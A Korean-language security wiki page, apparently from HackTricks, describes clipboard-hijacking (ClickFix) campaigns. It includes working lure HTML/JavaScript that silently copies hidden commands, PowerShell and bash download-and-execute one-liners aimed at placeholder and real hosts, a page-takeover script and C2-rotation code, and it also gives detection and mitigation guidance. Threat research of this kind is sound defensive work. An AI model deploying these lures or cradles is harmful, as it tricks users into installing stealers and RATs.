# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "직접 복사하지 않은 것은 절대 붙여넣지 마라." – 오래된 조언이지만 여전히 유효하다

## 개요

Clipboard hijacking – also known as *pastejacking* – 는 사용자가 명령을 복사하여 붙여넣기하면서 내용을 확인하지 않는다는 사실을 악용한다. 악성 웹 페이지(또는 Electron 같은 JavaScript-capable 컨텍스트나 Desktop application)는 공격자가 제어하는 텍스트를 시스템 클립보드에 프로그래밍 방식으로 넣는다. 피해자는 보통 정교하게 조작된 social-engineering 지침에 의해 **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), 또는 터미널을 열어 클립보드 내용을 *paste* 하도록 유도되어 즉시 임의의 명령이 실행된다.

왜냐하면 **파일이 다운로드되지 않고 첨부파일이 열리지 않기 때문에**, 이 기법은 첨부파일, 매크로 또는 직접 명령 실행을 모니터링하는 대부분의 이메일 및 웹 콘텐츠 보안 제어를 우회한다. 따라서 이 공격은 NetSupport RAT, Latrodectus loader 또는 Lumma Stealer와 같은 범용 악성코드 패밀리를 배포하는 phishing 캠페인에서 인기가 있다.

## Forced copy buttons and hidden payloads (macOS one-liners)

일부 macOS infostealers는 설치 사이트(e.g., Homebrew)를 복제하고 사용자들이 보이는 텍스트만 선택하지 못하도록 **“Copy” 버튼 사용을 강제**한다. 클립보드 항목에는 예상되는 설치 명령에 Base64 페이로드가 덧붙여 포함된다(예: `...; echo <b64> | base64 -d | sh`), 따라서 한 번의 붙여넣기로 둘 다 실행되며 UI는 추가 단계를 숨긴다.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## ClickFix / ClearFake 흐름

1. 사용자가 typosquatted 또는 compromised 사이트(예: `docusign.sa[.]com`)를 방문합니다.
2. 주입된 **ClearFake** JavaScript는 `unsecuredCopyToClipboard()` 헬퍼를 호출하여 Base64-encoded PowerShell one-liner를 클립보드에 조용히 저장합니다.
3. HTML 지침은 피해자에게 다음을 지시합니다: *“**Win + R**을 누르고 명령을 붙여넣은 다음 Enter를 눌러 문제를 해결하세요.”*
4. `powershell.exe`가 실행되어 정상 실행 파일과 악성 DLL을 포함한 아카이브를 다운로드합니다 (classic DLL sideloading).
5. 로더는 추가 단계를 복호화하고 shellcode를 주입하며 persistence를 설치(예: scheduled task)합니다 — 궁극적으로 NetSupport RAT / Latrodectus / Lumma Stealer를 실행합니다.

### NetSupport RAT 체인 예시
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (정상적인 Java WebStart)는 자신의 디렉터리에서 `msvcp140.dll`을 검색합니다.
* 악성 DLL은 **GetProcAddress**로 API를 동적으로 조회하고, **curl.exe**를 통해 두 개의 바이너리(`data_3.bin`, `data_4.bin`)를 다운로드하며, 롤링 XOR 키 `"https://google.com/"`으로 이를 복호화한 뒤 최종 쉘코드를 주입하고 **client32.exe** (NetSupport RAT)를 `C:\ProgramData\SecurityCheck_v1\`에 압축 해제합니다.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe**로 `la.txt`를 다운로드합니다
2. **cscript.exe** 내부에서 JScript 다운로더를 실행합니다
3. MSI 페이로드를 가져옴 → 서명된 애플리케이션 옆에 `libcef.dll`을 드롭 → DLL sideloading → shellcode → Latrodectus.

### MSHTA를 통한 Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** 호출은 숨겨진 PowerShell 스크립트를 실행하여 `PartyContinued.exe`를 가져오고, `Boat.pst`(CAB)를 추출하며, `extrac32`와 파일 결합을 통해 `AutoIt3.exe`를 재구성한 후 `.a3x` 스크립트를 실행하여 브라우저 자격 증명을 `sumeriavgv.digital`로 유출합니다.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

일부 ClickFix 캠페인은 파일 다운로드를 완전히 건너뛰고 피해자에게 WSH를 통해 JavaScript를 가져와 실행하는 one‑liner를 붙여넣도록 지시하여 이를 영구화하고 매일 C2를 회전시킵니다. 관찰된 예시 체인:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
주요 특성
- 난독화된 URL을 런타임에 역순으로 복원하여 단순한 검사를 회피함.
- JavaScript는 Startup LNK (WScript/CScript)를 통해 스스로 지속되며, 현재 날짜에 따라 C2를 선택해 빠른 domain rotation을 가능하게 함.

날짜로 C2s를 회전시키기 위해 사용된 최소 JS 조각:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
다음 단계에서는 일반적으로 loader를 배포하여 persistence를 확보하고 RAT(예: PureHVNC)을 가져오며, 종종 TLS를 하드코딩된 certificate에 pinning하고 트래픽을 chunking합니다.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- 매일 변경되는 C2 호스트명 및 URL들이 `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` 패턴을 사용합니다.
- 클립보드 쓰기 이벤트가 Win+R 붙여넣기 이후 즉시 `powershell.exe` 실행으로 이어지는지 상관관계 분석을 수행하세요.

Blue-teams는 clipboard, process-creation 및 registry telemetry를 결합하여 pastejacking 남용을 정확히 식별할 수 있습니다:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` 는 **Win + R** 명령의 기록을 유지합니다 – 비정상적인 Base64 / 난독화된 항목을 확인하세요.
* Security Event ID **4688** (Process Creation)에서 `ParentImage` == `explorer.exe`이고 `NewProcessName`가 { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }에 포함되는 레코드를 찾으세요.
* Event ID **4663**: 의심스러운 4688 이벤트 바로 직전에 `%LocalAppData%\Microsoft\Windows\WinX\` 또는 임시 폴더에서의 파일 생성 이벤트를 확인하세요.
* EDR clipboard sensors (if present) – `Clipboard Write` 이벤트가 바로 이어서 새로운 PowerShell 프로세스로 이어지는지 상관관계 분석을 수행하세요.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

최근 캠페인들은 가짜 CDN/브라우저 검증 페이지("Just a moment…", IUAM-style)를 대량으로 생성하여 사용자가 클립보드의 OS별 명령을 네이티브 콘솔에 붙여넣도록 유도합니다. 이는 브라우저 샌드박스 밖으로 실행을 전환하며 Windows와 macOS 전반에서 작동합니다.

Key traits of the builder-generated pages
- `navigator.userAgent`를 통해 OS를 감지하여 페이로드를 맞춤(Windows PowerShell/CMD vs. macOS Terminal). 지원되지 않는 OS에는 착시를 유지하기 위한 선택적 decoy/no-op가 포함될 수 있습니다.
- 체크박스/Copy 같은 무해한 UI 동작에서 자동으로 클립보드 복사 수행 — 표시되는 텍스트와 클립보드 내용이 다를 수 있습니다.
- 모바일 차단 및 단계별 안내 팝오버: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- 선택적 난독화 및 single-file injector로 침해된 사이트의 DOM을 덮어써 Tailwind 스타일의 verification UI를 삽입(새 도메인 등록 불필요).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS 초기 실행의 persistence
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`를 사용하면 터미널이 닫힌 후에도 실행이 계속되어 눈에 띄는 흔적을 줄입니다.

침해된 사이트에서의 in-place page takeover
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Pages that bind Clipboard API to verification widgets; mismatch between displayed text and clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace in suspicious contexts.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` shortly after a browser interaction; batch/MSI installers executed from `%TEMP%`.
- macOS endpoint: Terminal/iTerm spawning `bash`/`curl`/`base64 -d` with `nohup` near browser events; background jobs surviving terminal close.
- Correlate `RunMRU` Win+R history and clipboard writes with subsequent console process creation.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake continues to compromise WordPress sites and inject loader JavaScript that chains external hosts (Cloudflare Workers, GitHub/jsDelivr) and even blockchain “etherhiding” calls (e.g., POSTs to Binance Smart Chain API endpoints such as `bsc-testnet.drpc[.]org`) to pull current lure logic. Recent overlays heavily use fake CAPTCHAs that instruct users to copy/paste a one-liner (T1204.004) instead of downloading anything.
- Initial execution is increasingly delegated to signed script hosts/LOLBAS. January 2026 chains swapped earlier `mshta` usage for the built-in `SyncAppvPublishingServer.vbs` executed via `WScript.exe`, passing PowerShell-like arguments with aliases/wildcards to fetch remote content:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs`는 서명되어 있으며 일반적으로 App-V에서 사용됩니다; `WScript.exe`와 결합되어, 특이한 인자들(`gal`/`gcm` 별칭, 와일드카드화된 cmdlets, jsDelivr URLs)을 동반하면 ClearFake에 대해 높은 신뢰도의 LOLBAS 단계가 됩니다.
- 2026년 2월 가짜 CAPTCHA payloads가 다시 순수한 PowerShell 다운로드 크래들로 전환되었습니다. 실제 예시 두 건:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- 첫 번째 체인은 메모리 내 `iex(irm ...)` grabber이며; 두 번째 체인은 `WinHttp.WinHttpRequest.5.1`을 통해 스테이징하고 임시 `.ps1`을 작성한 후 `-ep bypass`로 숨겨진 창에서 실행됩니다.

이 변종들에 대한 탐지/헌팅 팁
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` 또는 PowerShell 크래들(또는 PowerShell cradles)이 클립보드 쓰기/Win+R 직후에 이어지는 경우.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, 또는 raw IP `iex(irm ...)` 패턴.
- Network: 웹 브라우징 직후 스크립트 호스트/PowerShell에서 CDN worker 호스트나 블록체인 RPC 엔드포인트로의 아웃바운드 연결.
- File/registry: `%TEMP%` 아래 임시 `.ps1` 생성 및 이러한 one-liners를 포함하는 RunMRU 항목; 외부 URL 또는 난독화된 alias 문자열과 함께 실행되는 signed-script LOLBAS (WScript/cscript/mshta)에 대해 차단/경고.

## 완화 조치

1. 브라우저 강화 – 클립보드 쓰기 접근(`dom.events.asyncClipboard.clipboardItem` 등)을 비활성화하거나 사용자 제스처를 요구.
2. 보안 인식 – 사용자가 민감한 명령을 *직접 입력*하거나 먼저 텍스트 편집기에 붙여넣도록 교육.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control로 임의의 one-liners 차단.
4. 네트워크 제어 – 알려진 pastejacking 및 악성 C2 도메인으로의 아웃바운드 요청 차단.

## 관련 트릭

* **Discord Invite Hijacking**는 악성 서버로 사용자를 유인한 후 동일한 ClickFix 접근법을 자주 악용합니다:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## 참고자료

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
